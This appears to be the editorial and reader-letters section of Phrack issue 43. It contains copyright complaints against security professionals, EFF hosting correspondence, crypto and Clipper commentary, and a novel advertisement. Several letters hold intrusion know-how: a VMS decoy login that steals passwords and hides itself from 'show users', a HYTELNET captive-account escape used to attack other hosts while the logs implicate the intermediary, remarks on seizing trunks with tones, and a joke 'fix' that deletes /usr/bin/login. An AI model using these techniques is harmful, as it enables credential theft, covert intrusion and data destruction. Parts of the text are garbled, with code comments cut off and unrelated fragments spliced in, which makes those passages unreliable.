Well, here it is:  Phrack 43.  This issue should really piss every security
professional off.  Well, actually, none of them should ever see it because
only two people have registered their subscriptions.

But, then again I think we all know that the whole world is FULL of
lying, thieving people who just don't care about other people's
property.  No, smarty, not hackers...computer professionals!

CASE 1:

The Computer Emergency Response Team.  Bastions of life, liberty and the
pursuit of happiness.  CERT had been on the Phrack mailing list
previously, and was sent a copy of 42 (as was everyone) to give them
the opportunity to subscribe.  Rather than do the right thing
and let us at Phrack know that they were not interested in paying,
and to take their name off the list, Ed DiHart instead forwarded off
several copies to his cronies.

Luckily for us, Ed is not the best typist, and the mail bounced all the way
back to Phrack.  I called Ed and asked him why he would do such a thing,
which was clearly a direct violation of US Copyright Law.  Ed claimed
he didn't know of any new rules for Phrack, and that he had always forwarded
off a few copies to his pals.  I told Ed that this practice was unacceptable
and that if he wanted to continue to get Phrack he and his pals would all have
to register their subscriptions.  Ed said that he did not want to pay
and to take CERT off the list.

A month prior to this Ed had said to me at the Computers, Freedom & Privacy
conference in San Francisco, "Why are YOU here anyway?  It sure is IRONIC
that someone whose goal in life was to invade other people's privacy would
be attending a conference on protecting privacy."  I walked away from him in
disgust.

While talking to Ed about Phrack I said, "You know Ed, it sure is IRONIC
that an organization such as CERT, whose main goal is to help protect
the property of others would so flagrantly violate US Copyright law and
completely disregard someone's property rights."  Man, did that feel great!


CASE 2:

BT Tymnet.  Dale Drew, security guru, made the statement on IRC about
Phrack, "I have absolutely no desire to pay for anything having to do with
hackers."  Later, someone from Dale's machine at BT Tymnet (opus.tymnet.com)
logged into Len Rose's machine and ftp'd Phrack 42.  With prior knowledge
Phrack was not free, he willingly used company property to commit a crime.
At most companies, that is grounds for termination.  Luckily for Dale
Tymnet doesn't give a shit.  In fact, Dale several times since has gone
back on IRC stating, "People here are Tymnet are kind of upset about
Phrack 42."  This just shows that people at Tymnet are just as criminal
as they say hackers are.  Since they could care less about MY property,
then why should I care about theirs?  Maybe I should print a list of
all Tymnet internal NUIs!  Well, two wrongs won't make a right, so I better
not.

I did, however, send email to Dale stating that we were aware of Tymnet's
transgressions and that we may be forced to take legal action.  I have
decided to offer BT a sweet deal on a company-wide site license.  We
shall see if they take me up on this offer, or continue to steal Phrack.

CASE 3:

Gail Thackeray.  A woman sworn by the court to uphold the laws of the
land.  This woman had the audacity to tell me that unless I
enforced my copyright, it was worthless.  Unless I enforce it.  What the
hell does that mean?  Am I supposed to raid companies myself and
go dig for evidence that they have stolen my information?  Geez...it's
not like I'm Bellcore.  Gail's disgusting interpretation of the law,
that unless you are big enough to stand up for yourself then you have
no recourse, is a festering sore on the face of the American Legal system
and I personally am appalled that this woman is allowed to act as
a law enforcement professional.

Oh well, as you can tell I've had a little fun with all this.  And I have
effectively proven my point.  Security people, corporate professionals,
and law enforcement types are just as unscrupulous and unethical as they
have always claimed that we are.

Only TWO PEOPLE within the computer/legal/security profession have the right
to receive and keep copies of Phrack.  Winn Schwartau, and a man at Mitre.
It's amazing that they are the only ones with any scruples, isn't it?

Well, let's get on with the issue.  This one is pure, unadulterated evil.
Only the strong will survive this time.  We've got Cellular, we've got
Novell, we've got 5e, we've got PHRACK TRIVIA!  Get comfortable, grab
your favorite intoxicant, and enjoy.

*NOTES*  Some of you will recognize the 5ESS file from the Summer issue of
2600 magazine.  This file was sent to both myself and E. Goldstein.  I
was told by the author that 2600 was not printing it.  Wrong.  Well, we
got permission from 2600 to print it here too since its such a good file,
and since I spent like 8 hours dealing with the author correcting
and editing it.  In the future gang, if you send something to Phrack AND
to 2600, TELL US BEFOREHAND!  The last thing I want to hear is, "Phrack
is plagiarizing 2600...gawd they are so lame."  The acronym file, you will
note, is DIFFERENT.  Heh.

In addition to the above, you may notice that we were a bit late in
distributing this issue.  As many of you saw through the "resubscribe"
blurb sent over the mailing list, Phrack is not going through Stormking.COM
any longer.  The struggle to relocate put us into further delays
but I've managed to take care of securing a new distribution site.
We want to thank everyone at Stormking for shipping Phrack out for
so long, and wish them the best in their future endeavors.

Chris,

Craig Neidorf gave me these addresses as ways to reach you.  He tells me
that you are currently editing Phrack.  I hope you are well.

Recently the EFF sysadmins, Chris Davis and Helen Rose, informed me that
eff.org was using so much of its T-1 bandwidth that UUNET, who supplies our
IUP connection, was charging us an extra $1,000 per month.  They did some
investigation at my request.  We determined that Phrack traffic alone was
responsible for over 40% of the total bytes transferred from the site over
the past year or so.  This is several gigabytes per month.  All in all, the
CuD archive, which contains Phrack, CuD, and other publications accounts
for 85% of our total traffic.  All of the email to and from EFF, Usenet
traffic, and other FTP (from the EFF archive, the CAF archive, and others)
constitutes about 15%.

EFF isn't going to be able to carry it any more because it is effectively
costing us $1,000 per month.  The fundamental problem is that Phrack is so
popular (at least as a free good) to cause real expense in transmission
costs.  Ultimately the users are going to have to pay the costs because
bandwidth (when measures in gigabytes anyway) isn't free.   The 12K per
year it costs us to carry Phrack is not something which EFF can justify in
its budget.  I'm sure you can understand this.

On July 1, eff.org moves from Cambridge to Washington, DC which is when I
expect we will stop carrying it.  I wanted to raise this issue now to let
you know in advance of this happening.

I have also asked Chris and Helen to talk to Brendan Kehoe, who actually
maintains the archive, to see whether there is anything we can do to help
find another site for Phrack or make any other arrangement which will
result in less loss of service.

[Editor:  Well, all things must come to an end.  Looks like EFF's
          move to Washington is leaving behind lots of bad
          memories, and looking forward to a happy life in the hotbed
          of American politics.  We wish them good luck.  We also
          encourage everyone to join.........CPSR.

          In all fairness, I did ask Mitch more detail about the
          specifics of the cost, and he explained that EFF was paying
          flat rate for a fractional T-1, and whenever they went over
          their allotted bandwidth, they were billed above and beyond
          the flat rate.  Oh well.  Thank GOD for Len Rose.

This is a submission to the next issue of phrack...thanks for the great

Greetings Furds:

 Have you ever wanted to impress one of those BBS-babes with your astounding
knowledge of board tricks?  Well *NOW* you can!  Be the life of the party!
Gain and influence friends!  Irritate SysOps!  Attain the worship and
admiration of your online pals.  Searchlight BBS systems (like many other
software packages) have internal strings to display user information in
messages/posts and the like.  They are as follows (tested on Searchlight BBS
System v2.25D):

        \%A  =  displays user's access level
        \%B  =  displays baud rate connected at
        \%C  =  unknown
        \%F  =  unknown
        \%G  =  displays graphics status
        \%K  =  displays user's first name
        \%L  =  displays system time
        \%M  =  displays user's time left on system
        \%N  =  displays user's name in format: First Last
        \%O  =  times left to call "today"
        \%P  =  unknown
        \%S  =  displays line/node number and BBS name
        \%T  =  displays user's time limit
        \%U  =  displays user's name in format: FIRST_LAST

All you gotta do is slam the string somewhere in the middle of a post or
something and the value will be inserted for the reader to see.

 Example:  Hey there chump, I mean \%K, you better you better UL or log
           off of \%S...you leach too damn many files..you got \%M mins
           left to upload some new porn GIFs or face bodily harm and
           mutilation!.

[Editor:  Ya know, once a LONG LONG time ago, I got on a BBS and
          while reading messages noticed that a large amount of
          messages seemed to be directed at ME!!#  It took me
          about 10 minutes to figure it out, but BOY WAS I MAD!

          Then I added my own \%U message for the next hapless fool.
          :)  BIG FUN!]

[Editor:  This is an example of what NOT to send to Phrack.
          This is probably the worst piece of garbage I've
          received, so I had to print it.  I can only hope
          that it's a private joke that I just don't get.

          Uh, please don't try to write something worse and
          submit it hoping to have it singled out as the
          next "worst," since I'll just ignore it.]

****************************************************************************

Dear Phrack,
   I was looking through Phrack 42 and noticed the letters about password
stealers. It just so happened that the same day I had gotten extremely
busted for a program which was infinitely more indetectible. Such is life.
I got off pretty well being an innocent looking female so it's no biggie.
Anyway, I deleted the program the same day because all I could think was
"Shit, I'm fucked". I rewrote a new and improved version, and decided to
submit it. The basic advantages of this decoy are that a) there is no
login failure before the user enters his or her account, and b) the
program defines the show users command for the user so that when they
do show users, the fact that they are running out of another account
doesn't register on their screen.
   There are a couple holes in this program that you should probably be
aware of. Neither of these can kick the user back into the account that
the program is running from, so that's no problem, but the program can
still be detected. (So basically, don't run it out of your own account...
except for maybe once...to get a new account to run it out of) First, once
the user has logged into their account (out of your program of course) hitting
control_y twice in a row will cause the terminal to inquire if they are
doing this to terminate the session on the remote node. Oops. It's really no
problem though, because most users wouldn't even know what this meant. The
other problem is that, if the user for some strange reason redefines show:

$show == ""

then the show users screen will no longer eliminate the fact that the account
is set host out of another. That's not a big deal either, however, because
not many people would sit around randomly deciding to redefine show.
   The reason I was caught was that I (not even knowing the word "hacker"
until about a month ago) was dumb enough to let all my friends know about the
program and how it worked. The word got spread to redefine show, and that's
what happened. The decoy was caught and traced to me. Enough BS...here's the
program. Sorry...no UNIX...just VMS.
                                            Lady Shade

I wrote the code...but I got so many ideas from my buddies:
Digital Sorcerer, Y.K.F.W., Techno-Pirate, Ephemereal Presence, and Black Ice

!!!! you have just logged in, the program should not kick straight back   !!!!
!!!! to your command level, but rather execute your login.com. 2) You     !!!!
!!!! can log in to the account which is stealing the password from a      !!!!

!!!! This section is how one covers up the fact that the account which has !!!!

!!!! This section first writes the show users data to a file and alters    !!!!
!!!! it before it is written to the screen for viewing by the user. There  !!!!
!!!! may exist many forms of the show users command in your system, and    !!!!
!!!! you may have to handle each one differently. I have written only two  !!!!
!!!! manipulations into this code to be used as an example. But looking    !!!!
!!!! at how this is preformed should be enough to allow you to write your  !!!!
!!!! own special cases. Notice that what happens to activate this section  !!!!
!!!! of the program is the computer detects the word "show" and interprets !!!!
!!!! it as a procedure call. The words following show become variables     !!!!
!!!! passed into the program as p1, p2, etc. in the order which they       !!!!
!!!! were typed after the word show. Also, by incorporating a third data   !!!!
!!!! file into the manipulations, one can extract the terminal id for the  !!!!
!!!! account which the program is running out of and plug this into the    !!!!
!!!! place where the user's line displays his or her terminal id. Doing    !!!!
!!!! this is better that putting in a fake terminal id, but that is just a !!!!

 some unknown reason appear equal  style,  and  all  loopback  remind
 something medium between "relations search" [Hello Dear Phrack, I am
 security expert of our local area, but when I looked  to  output  of
 "last" program (oh,yeah - "last" it is ...), I ocassionaly  under  -
 standed  what apparently someone elite  hacker  penetrated  into  my
 unpassworded  account!  But  how  he  knew  it???  I  need  to  talk
 with him! Please mail me at security@...] and "make yourself" [Yep.I
 totally wrote program which gets file listing from target  vicitim's

Good mornin' Ladys and Gentelmen! I hacking and phreaking. I know what
it is horrible (don't read it please - this message to Bart),  but  I
doing it all the time (today already 3 month). I have not much time to
write, and here is the subject - I broke into  one  military  computer
and stole their mail about new security bug!!! l00k f3r |t:

Subject: The huge Sun 4.x login hole.(possibly Ulitix 3.0,BSD,AIX
                                       and many yet unknown systems)

Impact: Allow random intruders to gain "root" access.

Description:
   The huge security hole was there and waiting! Type:

     $ login root

   [ no option required ], and You are! All what You need to know its
   just root's password, but it (pw), sure, can be easily obtained from
   real root, by asking him (root). Ex - "$ talk root"

Possible fix until copyrighted patch come out:

     #rm /usr/bin/login
     #cp /usr/games/fortune /usr/bin/login

If you believe that your system has been compromised, contact CERT CC. Call
our hotline 900-FBI-PRIVATE (24 a day,please not in dinner time or in  time
of "Silence of the Lamb"), leave Inet address of your system and  number of
private credit card.
                               - - -

P.S. Yup! If You won't think what I am toady - I wanna say also thanks to TK

[Editor:  We here at Phrack are forever in debt to Mr. Len Rose for
          allowing us to use ftp.netsys.com as our new official FTP
          site after getting the boot off EFF.  It takes a steel
          set of huevos to let such an evil hacker publication
          reside on your hard drive after serving time for having
          dealings with evil hackers.  We are STOKED!  Thanks Len!
          Netsys is not your average site, INDEED!]

Something Phrack might like to see:

The contributors to and practices of the Electronic Frontier Foundation
disclose quite accurately, just who this organization represents.  We
challenge the legitimacy of the claim that this is a "public interest"
advocate.  Here is a copy of their list of contributors:

[FINS requested the Office of the Attorney General of the Commonwealth of
Massachusetts to provide us with a list of contributors of over $5000, to
the Electronic Frontier Foundation, required by IRS Form 990.  Timothy E.
Dowd, of the Division of Public Charities, provided us with a list (dated
January 21, 1993), containing the following information.  No response was
given to a phone request by FINS directly to EFF, for permission to inspect
and copy the most current IRS Form 990 information.]

[Editor:  Well, hmmm.  Tell you guys what:  Send Phrack that
          much money and we will give up our ideals and move to
          a new location, and forget everything about what we
          were all about in the beginning.  In fact, we will turn
          our backs on it.  Fair?

Hi there!

As a beginner in Cyberspace & a new reader of Phrack, I just wanna say thiz...
IT'S X-CELLENT DUDES!!!!!.

Keep the good work!!!!!.

I only have your latest issue, and I never read previous ones, so this
is maybe old stuff... but I would like to see the Infonet network and
Datapac covered in some of UR articles... let me know if u published something
in recent issues.

Greetings from South America,

LawEnforcer.
(yes, it's an Alias!!!)

[Editor:  Well, InfoNet we've never done.  Any takers?  Datapac I
          personally scanned some time ago, but almost ALL of the
          100K of NUA's I found still work.  Maybe someone should
          take my script and re-scan it.  Anyone?  Class?  Bueler?]

****************************************************************************

begin contribution-------------------------------
VMS machines that have captive accounts often have accounts such as HYTELNET.
This is an account which will archie for you, or take you to a few select BBSs
or any of many boring things to do.  You simply log in as HYTELNET, there isn't
a password, and go through the menus.  Now, that's where the fun begins.  If
you use HYTELNET to telnet anywhere, while it is connecting, simply  type your
local telnet escape key (something like ^\ or ^]) and then........you have a
telnet prompt.  Unfortunately, if you close or disconnect, it will return to
the HYTELNET menus, and you can't open a new connection, since you're already
connected.  So, what you do is SPAWN whatever process you want.....you could
SPAWN TELNET or SPAWN FTP or SPAWN anything else for that matter.  SPAWN with
no arguments (the shell escape) does not work, however.  This works from any
captive account that telnets.  So, you can telnet to a VAX that has HYTELNET,
log in as HYTELNET, do what I told you, and then hack to wherever, since the
reports from the target site will show that HYTELNET@insert.vax.site committed
the heinous crimes that you did.
                                                  Kaneda
end contribution--------------------------------

[Editor:  Kaneda:  thanks for that tidbit.  Now I'm sure to get grief
          on IRC from someone coming from an odd site.  :)
          Give my regards to Tetsuo.  "But some day...we will be"]

We are all Australians and all read your magazine to death..
a friend of mine runs a board called shred til ya ded which is basically
a hpac and warez assortment... nothing 0 day but definately good for hacking

you mentioned in phrack 42 that you would like people from other countries
to write pieces about the scene there... well depending on the kind of thing
you want i would be more than happy to give it a go with some mates
thanks

I remember seeing a message somewhere on the WELL saying an issue of
Phrack carried listings of Viruses.  Could you tell me which one(s)?

Also, do you know of any sites which have virus listings archived ?

Thanks,

Jon Barber

[Editor:  Well, John, Phrack doesn't carry virii info.  You might
          check around for 40hex.  Personally, I think virii
          are vastly overrated hype driven onward by McAffee
          and other self-serving interests.  That is why we
          ignore them.  (That is also why I don't mention them
          when I lecture on computer security...they are no
          big thing.)]

Ok,

So I was reading Phrack 42's listing for SprintNET nodes... But there was
no information on how to access it..

What are the ACNS For the Sprintnet?  Is there a Phrack out that details
use of the SprintNET..

Would appreciate ANY and ALL, as I've never heard of it being used widely
like the Internet, and would like to know how to use it..

[Editor:  Jack...you kids are spoiled.  You and your Internet.  Hrumph.

          Sheesh.

          To answer your question, Sprintnet (used to be Telenet, and
          always will be to me) is a public packet switched network.
          It can be accessed in nearly EVERY city in the USA, and in

RE: Loop-Back

I was wondering if it would be possible for you to do something on Novell LAN
security, as we have one at my high school. I was also wondering about
bluebox tones...in my area, if you call  into the next county, sometimes you
hear what sounds like bluebox tones. I had thought these lines were digital,
and therefore, would not require tones of any type.. any ideas?

RF Burns

[Editor:  As for the Novell...check later in this issue.
          As for the MF tones...when calls go from one area to another
          it is quite common to hear multi-frequency tones.  Depending
          upon the way the call is routed, your particular pick of LD
          carrier and the equipment between you and the destination,
          you may hear these tones.  You may even be one of the lucky
          ones, and be able to seize a trunk.  Using certain LD carriers
          you can still box, but usually you are stuck with a trunk that
          can't get out of the area.  Alas.]

Hi -

I'm a student in the MLS program here at SUNY Albany.  I
found out about Phrack while researching a paper for my public policy class,
on the ECPA and shit.

Well, I gave a fabulous 45-minute presentation on it all and then wrote
an even better paper for which I was rewarded with an A as well as an A
for the class.  Turns out John Perry Barlow and Mitch Kapor are heroes of
my professor as well.

So now I'm hooked.  For my thesis I'm writing a user manual for librarians
on the Internet and helping teach a class in telecommunications.

Just wanted to let you phrack-types know you're my heroes and I want to be
a member of the phrack phamily.  Can't send any money, though.  *:(

Keep the faith,
        hopey t


[Editor:  That's really great!  Usually profs are terribly anal about
          anything regarding Phrack and/or hacking.  You are very
          lucky to have had such an instructor.  Congrats on the
          class and good luck with your thesis!]

    Hi!
    I was just glancing through Phrack #42, and read the portion
that sez that all computer professionals (essentially) have to
delete this and even old copies of Phrack.
    Coupla questions: I'm a Network Administrator for a University,
do I have to comply? It's not like I am a thug from Bellcore or
anything like that. Although one of the things I am concerned with,
professionally, is the security of our systems, I am no Cliff Stoll.
If I were to catch an unauthorized visitor, I would give him the boot,
not chase him down with prosecution in mind.
    I have, of course, deleted all my old Phracks as well as #42,
but I would like to be able to re-snarf them. Let me know...
                                           Thanks!
                                           Dan Marner

[Editor:  Well, Dan, technically Phrack could quite possibly
          be beneficial to you and assist you with your career, and
          this is the typical scenario in which we request that you
          register your subscription and pay the registration fee.
          Of course, we don't have the SS as our own personal
          thugs to go break your legs if you don't comply. :)
          You might at least try to get your employer to pay for
          the subscription.

          As far as issues prior to 42 go, KEEP THEM!  They are
          exempt from anything, and are arguably public domain.]

****************************************************************************

Hey there...

I don't know if this will get to Dispater or to the new editor.  Since the
change in editorship, the proper way to contact Phrack has become sort of a
mystery.  (The new address wasn't included in Phrack 31.)

Anyway, I'm writing to bitch about the quality of #31.  I've got two main beefs:
1. The article about fake-mail was GREAT until it turned into a "how-to"
 primer on using the info given to cause damage.  That is exactly the
 kind of thing that will end up getting you sued.  I have some legal
 background, and I'm pretty sure that the author of that article and
 possibly even Phrack itself and its editors are now open to a damn
 good argument for tortuous negligence if anyone follows the instructions
 and damages someone on Compuserve, etc.

 The argument will go something like, "Phrack set into motion a chain of
 events that led to my client being damaged."  You guys should have
 just given the info, and left off the moronic ways to abuse it.

2. The article on "Mall Security Frequencies" was copied directly from
 Popular Communications, Nov. 1992 issue.  Hell, that was even their
 cover story.  Can we say "copyright enfringement?"  If not, I'm sure
 you'll be _hearing_ it a few more times.  If I was still practicing,
 I'd call 'em up and ask their permission to sue on contingency.
 Split the damages obtained on a motion for summary judgment 50/50 with
 them.  It would only take a week and one filed complaint...

 Point is, you have opened yourselves up to get sued and lose EASILY.
 As much as I've enjoyed reading Phrack over the years, if this new
 staff continues in this manner, I'll be stuck with back-issues.

[Editor:  I think you meant 41, not 31.  But to answer your points:

          1) As long as there is a first amendment, Phrack will
             continue to print articles that some may or may not
             agree with.  Printing the blueprints for an atomic bomb
             does not make you an accomplice to those who build it
             and detonate it.
          2) Numbers are numbers.  Can we even spell "copyright
             infringement?"  If you were still "practicing..."
             We at Phrack wholeheartedly encourage you to again pick
             it up, and keep practicing and practicing until you
             get whatever it is you were practicing down pat.
             Obviously it must have been guitar, and not law.

          Such a litigious society we live in.  Suing Phrack would
          accomplish nothing.  It would not even hinder its
          publication.  Since Phrack has no money, nothing would
          be gained.  Even if fined, Phrack could not be forced to
          sell its computer equipment to pay fines, since this would
          be removing the livelihood of the publisher, thus it would
          continue its quarterly publication.  Where on Earth did
          you get such ideas?  You obviously know nothing about
          lawsuits.  Any lawyer would laugh at the thought of suing
          Phrack since it would gain nothing financially, and provide
          such a huge amount of bad publicity that even if a judgement
          were reached in their behalf it would not be worth it.
          Oh wait, you were a lawyer.  Now I know why the past tense.

          But you are correct on one point: we cannot print
          copyrighted material without permission.  You may have
          noted that last issue (among other changes) Phrack
          no longer includes full text of news items without
          prior permission from the publisher.  That was the
          ONLY thing that worried me about publishing Phrack, and
          so I changed it.

          We at Phrack welcome constructive criticism, but at least
          have the nerve to email directly, rather than hide behind
          an anonymous remailer.  That way, someone could have
          responded to you in a more direct and expeditious manner.]

I am a student at ukc in England and wish to subscribe to Phrack receiving
it as email at the following address ks16@ukc.ac.uk thank you and keep up the
good work.

We use unix and I would be interested in getting a copy of su (switch user)
which looks for the user file passwd.su in the users home directory.  I don't
know much about unix, but I do know it would need to run from my home directory
and access the kernel.

Many thanks for any help you may be able to give.

I had some beef with Rack's article in PHRACK 42. I've attached a
writeup of comments; you're welcome to a) forward it to him, b)
shitcan it, or c) publish it.

thx,
-Paul

My background: I've been into the scene for about 12 years. My day job
is writing unix s/w for a NASA contractor. My night job... well, never
mind that. I have a strong amateur interest in crypto, and I'd like to
share some of what people in the usenet/Internet community have been
kind enough to teach me.

Racketeer sez:
>        If you think that the world of the Hackers is deeply shrouded with
>extreme prejudice, I bet you can't wait to talk with crypto-analysts.  These
>people are traditionally the biggest bunch of holes I've ever laid eyes on. In

>"Oh, I just came up with this idea for an encryption which might be the best
>one yet" when people have dedicated all their lives to designing and breaking
>encryption techniques -- so what makes you think you're so fucking bright?

One real reason for this reaction is that people _have_ been studying
encryption for 100 years or so. As a result, many simple cryptosystems
are continually being reinvented by people who haven't ever made even
a simple study of cryptosystems.

Imagine if someone came up to you and said "Wow! I just found a
totally K00L way to send fake mail! It's radical! No one's ever
thought of it before!"

You'd laugh, right? _Anyone_ can figure out how to forge mail.

Well, _anyone_ can come up with the n-th variation of the Vigniere or
substitution cipher.

An even more important reason for their 'tude is that cypherpunks are
suspicious by nature.  A key principle of crypto is that you can only
trust algorithms that have been made public and thoroughly picked
over. Without that public scrutiny, how can you trust it?

The fedz' Digital Signature Standard (DSS) got raked in the crypto and
industry press because the fedz wouldn't disclose details of the
algorithm. "How do we know it's secure?" the cypherpunks asked. "We
won't use it if we don't know it's secure!"

Point being: (for those of you who skipped over) cypherpunks trust NO
ONE when the subject is encryption algorithms. Maybe J. Random Hacker
has come up with a scheme faster and more secure than, say, RSA. If
JRH won't share the details, no one will use it.

Racketeer goes on to talk about DES. One important thing to note is
that the unix crypt() function has NOTHING to do with DES. Here's part
of the SunOS 4.1.2 man page for crypt():

     crypt implements a  one-rotor  machine  designed  along  the
     lines  of  the  German Enigma, but with a 256-element rotor.
     Methods of attack on such machines are  widely  known,  thus
     crypt provides minimal security.

It's fairly clear that for a known-ciphertext attack (i.e. you
have a block of encoded text, but neither the key nor the plaintext)
will, at worst, require 2^56 decryption attempts. Various schemes for
parallel machines and so forth have been posted in sci.crypt. Does the
NSA have something that can crack DES? Probably.

Remember that DES is mostly used for short-lived session keys. ATMs
are a good example; they typically use a DES key for one communication
session with the central bank. New session, new key. DES is _not_ very
well suited for long-term encryption, since it can probably be
attacked in "reasonable" time by a determined, well-equipped opponent.

Now, on to PGP. Pretty Good Software was indeed threatened with a
lawsuit by Public Key Partners (PKP). PKP holds the patent on the RSA
public-key algorithm. (Many people, me included, don't think that the
patent would stand up in court; so far, no one's tried.)

The nice thing about PGP is that it offers IDEA and RSA in a nice
package. When you encrypt a file, PGP generates an IDEA session key,
which is then encrypted with RSA. An opponent would have to either a)
exhaustively search the entire IDEA key space or b) break RSA to
decrypt the file without the password.

Racketeer also mentions that PGP can optionally compress files before
encryption. There's a solid crypto reason behind this, too. One
well-known and successful way to attack an encrypted file is to look
for patterns of repeated characters. Since the statistical frequencies
of word and letter use in English (and many other languages; some
folks have even compiled these statistics for Pascal & C!) are
well-known, comparing the file contents with a statistical profile can
give some insight into the file's contents.

By compressing files before encrypting them, PGP is moving the
redundancy out of the text and into the small dictionary of
compression symbols. You'd still have to decrypt the file before you
could do anything useful with that dictionary, or even to determine
that it _had_ a signature!


[Editor:  Well, Rack is not to blame for all complaints I got about the
          file.  I printed a file that was several KBytes short of
          complete.  I noticed it seemed odd, but was assured by
          Rack, TK & Presence that I had received the correct file.
          I was misinformed, and should have known better than to
          print a file I should have known was incomplete.  I apologize
          to Rack & to all of you.

          About the other gripes:  Rack, care to reply?]

In issue #42 of Phrack there was an article about the USPS' practice of
selling change of address information without consumer consent.  I sent
the supplied form letter and carbon copied my congressman and senators.
Today I received a reply from the USPS Records Office.

April 1, 1993

Dear Mr. Rosen:

This concerns your recent Privacy Act request for accountings of
disclosure of mail forwarding information you have provided to the Postal
Service.

Disclosure of your forwarding address might have been made to individual
requesters by post offices or to subscribers to the National Change of
Address File (NCOA) by an NCOA licensee.  The NCOA is a consolidated file
of all forwarding information provided by postal customers and stored on
automated media.  Listholders may subscribe to NCOA to obtain the new
addresses of individuals for whom they already have in their possession
the old address.

For disclosures made by post offices, we are in the process of querying
the Washington, DC postmaster for any accountings.

For disclosures made from the NCOA system, we will begin querying NCOA
licensees all of which keep logs identifying the particular subscribers to
whom they have given NCOA information.  This accounting will not identify
with certainty the subscribers who have in fact received your new address,
but will give you a list of all subscribers receiving NCOA service for the
relevant time period and thus might have received your address.

Because a large number of requests like yours are being received, there
will be a delay in responding.  Requests are being processed in order of
receipt and you will be sent the accountings as soon as possible.  Your
patience is appreciated.

Sincerely,

Betty E. Sheriff
USPS Records Officer


[Editor:  Thanks for sending that letter in!  Amazing that someone
          in the maze of red tape even thought to make a form letter
          to respond.  I think I'll demand a disclosure as well.]

                           My Problems With Clipper

                               by Chris Goggans

The introduction of the new government backed encryption chip, Clipper,
has become a much debated issue.  I like many others have a large number
of problems with the chip and the problems it may bring in the future.

Why should we believe that this algorithm is robust?  For years
and years the NSA has backed DES as the encryption standard, when
cryptoanalysts have consistently brought its strength into question.
Additionally, the NSA has forced companies to submit their routines
for analysis before allowing them to be distributed commercially.  At
times they have even requested that the algorithms be purposely
weakened (we will assume that this was so they could more easily
decipher the encrypted data.)

With this in mind, why should we now meet anything endorsed by the NSA
with anything but suspicion?  And the fact that they refuse to release
the algorithm for security reasons even further adds to the suspicion
that this chip is either inherently weak and easily broken by the NSA
or that there is a backdoor in the algorithm that will allow the NSA
to effortlessly view any data encrypted with the Clipper.

Assuming that the government is on the level (for once), and they cannot
decipher Clipper-encrypted data without legally obtaining keys from
the assigned escrow agents.  The idea that the government will have to
go before a judge and show just cause for needing the keys pacifies some,
but from my own personal experience, the government will always get
what they want.  If the Secret Service could get a search warrant to
enter my home based solely upon one posting to an electronic bulletin board,
they could certainly obtain the necessary keys needed to decipher my
speech.  In fact, most non-technical persons will become needlessly
suspicious upon the mere mention of someone using encrypted speech mechanisms
and be more easily swayed to release the keys to law enforcement.

Should Clipper be adopted by various government agencies for use, this could
have serious trickle-down effects upon the lives of regular citizens.
Let's say the military decides that they will use Clipper.  They will then
most likely require their various contractors to use it as well.  Then
after continued use, the contractor may begin to tell its other customers
to communicate with them using Clipper also.  Usage could grow
exponentially as more and more people become comfortable with the use
of the secure communications devices until it becomes a defacto standard
without any legal pressures to use it ever mandated by Congress.
Should Congress mandate its use in any form, even if only within the
government itself, this potentiality will rapidly become reality.

If Clipper eventually receives such accepted use, anyone using any other
type of encryption will be immediately suspect.  "Why aren't you using
the chip?  What do you have to hide?"  The government may even outlaw
the use of any other encryption technologies, and if America
has become comfortable and satisfied with Clipper such a law may go
unchallenged, after all, only spies, child pornographers and drug dealers
would have something to hide, right?

As the world's computer networks creep ever further into our daily lives,
and the speed and power of supercomputers multiplies every year a rather
frightening scenario emerges.  Since the government is a major funder of
the Internet, who is to say that Clipper won't become the basis for
encrypting over its lines?  As our country moves closer to ISDN and the
PSTN and the PSDN's become more intertwined, who is to say that Clipper
won't be the basis for encryption since companies like AT&T already
endorse it?

Imagine if you will, a massively parallel supercomputer, the likes of which
may not exist yet, in a special room in Ft. Meade, or buried underground
in New Jersey, that consistently decrypts all communications and
sorts it according to communicating parties.  Then through the use of
AI, the computer decides whether or not such communication presents a threat
"to national security."

The structure of the telephone network already supports such an arrangement.
The purpose of the NSA allows for such an arrangement.  The advances in computer
technology will give the potential for such an arrangement.  If Clipper is
tainted, yet accepted, there will be no more privacy in America.

Perhaps my view of the government and their ultimate intentions is way off
base.  I sincerely hope so, as I do not want to be forced to take the mark
of this beast to conduct my business dealings and to live my life in peace.

      THE WORLD'S FIRST NOVEL-ON-THE-NET (tm) SHAREWARE!!!
                       By Inter.Pact Press

                      "TERMINAL COMPROMISE"
                        by Winn Schwartau

     A high tech thriller that comes from today's headlines!

"The Tom Clancy of computer security."
          Assoc. Prof. Dr. Karen Forcht, James Madison University

"Terminal  Compromise" is a highly praised novel about the  inva-
sion of the United States by computer terrorists.

Since  it was first published in conventional print form,  (ISBN:
0-962-87000-5)  it has sold extremely well world-wide,  but  then
again,  it never hit the New York Times Bestseller  List  either.
But that's OK, not many do.

Recently,  someone we know very well came up with a  real  bright
idea.   They suggested  that INTER.PACT Press take  the  unprece-
dented,  and maybe slightly crazy, step to put "Terminal  Compro-
mise" on the Global Network thus creating a new category for book
publishers.   The  idea is to offer  "Terminal  Compromise,"  and
perhaps  other titles at NOVEL-ON-THE-NET SHAREWARE(tm) rates  to
millions  of people who just don't spend a lot of time  in  book-
stores.   After  discussions with dozens of people -  maybe  even
more than a hundred - we decided to do just that.   We know  that
we're  taking a chance, but we've been convinced by  hackers  and
phreakers and corporate types and government representatives that
putting "Terminal Compromise" on the net would be a fabulous step
forward  into  the Electronic Age, (Cyberspace if you  will)  and
would encourage other publishers to take advantage of  electronic
distribution.   (It's still in the bookstores, though.)

To  the  best of our  knowledge,  no  semi-sorta-kinda-legitimate
-publisher has ever put a complete pre-published 562 page book on
the  network  as a form of Shareware.  So, I guess  we're  making
news  as  well as providing a service to the  world's  electronic
community.   The recommended NOVEL-ON-THE-NET SHAREWARE fees  are
outlined later (this is how we stay in business), so please  read
on.

WE KEEP THE COPYRIGHTS!

"Terminal  Compromise"  is  NOT  being  entered  into  the  public
domain.   It  is  being  distributed  electronically  so  hundreds
of thousands more  people  can enjoy it and  understand just where
we are heading with  our  omnipresent  interconnectedness  and the
potential dangers we face.  INTER.PACT Press  maintains  all copy-
rights to "Terminal Compromise" and does not, either intentionally
or  otherwise,  explicitly  or implicitly,  waive  any  rights  to
this  piece  of  work or  recourses  deemed  appropriate.  (Damned
lawyers.)

                TERMINAL COMPROMISE - THE REVIEWS

" . . . a must read . . ."

difficult to imagine a more comprehensive resource."
          PC Laptop

"Schwartau   .  . . has a definite flair for  intrigue  and  plot
twists.   (He) makes it clear that the most important  assets  at
risk are America's right to privacy and our democratic ideals."
          Personal Identification News

